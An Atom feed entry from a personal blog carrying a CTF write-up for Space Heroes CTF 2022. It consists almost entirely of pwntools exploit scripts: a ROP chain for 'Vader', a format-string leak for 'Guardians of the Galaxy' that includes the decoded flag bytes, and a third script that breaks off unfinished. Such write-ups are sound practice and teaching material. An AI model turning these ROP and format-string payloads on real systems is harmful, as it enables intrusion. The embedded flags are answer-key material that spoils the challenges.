<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="zh-CN" /><updated>2022-04-05T16:12:10+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">dayfly „ÅÆ note</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>huyinhao</name></author><entry><title type="html">Space Heroes CTF 2022 WP</title><link href="http://localhost:4000/pwn/2022/04/05/Space_Heroes_CTF_WP.html" rel="alternate" type="text/html" title="Space Heroes CTF 2022 WP" /><published>2022-04-05T00:00:00+08:00</published><updated>2022-04-05T00:00:00+08:00</updated><id>http://localhost:4000/pwn/2022/04/05/Space_Heroes_CTF_WP</id><content type="html" xml:base="http://localhost:4000/pwn/2022/04/05/Space_Heroes_CTF_WP.html"><![CDATA[<h2 id="vader">Vader</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vader'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">20712</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
                <span class="n">execve</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'execve'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span><span class="p">,</span> <span class="n">execve</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="c1"># rdi   rsi   rdx   rcx   r8    r9
</span>
<span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x000000000040165b</span>
<span class="n">rsi_r15</span> <span class="o">=</span> <span class="mh">0x0000000000401659</span>
<span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x00000000004011ce</span>
<span class="n">rcx_r8</span> <span class="o">=</span> <span class="mh">0x00000000004011d8</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> 
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402EC9</span><span class="p">)</span> 
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402ECE</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402ED3</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_r8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402ED6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402EDA</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40146B</span><span class="p">)</span> 
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4015B5</span><span class="p">)</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'Now I am the master &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="guardians-of-the-galaxy">Guardians of the Galaxy</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./guardians'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">12690</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s">'%12$p-%13$p-%14$p-%15$p-%16$p'</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'Does Quill manage to win the dance battle?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>

<span class="n">flag_l</span> <span class="o">=</span> <span class="p">[</span><span class="s">'6d697b6674636873'</span><span class="p">,</span> <span class="s">'636172747369645f'</span><span class="p">,</span> <span class="s">'756f795f676e6974'</span><span class="p">,</span> <span class="s">'7d'</span><span class="p">]</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">flag_l</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">):</span>
                <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
                <span class="n">ch_l</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="warmup-to-the-dark-side">Warmup to the Dark Side</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">30096</span><span class="p">)</span>

<span class="c1"># binary = ''
# elf = ELF(binary)
</span><span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
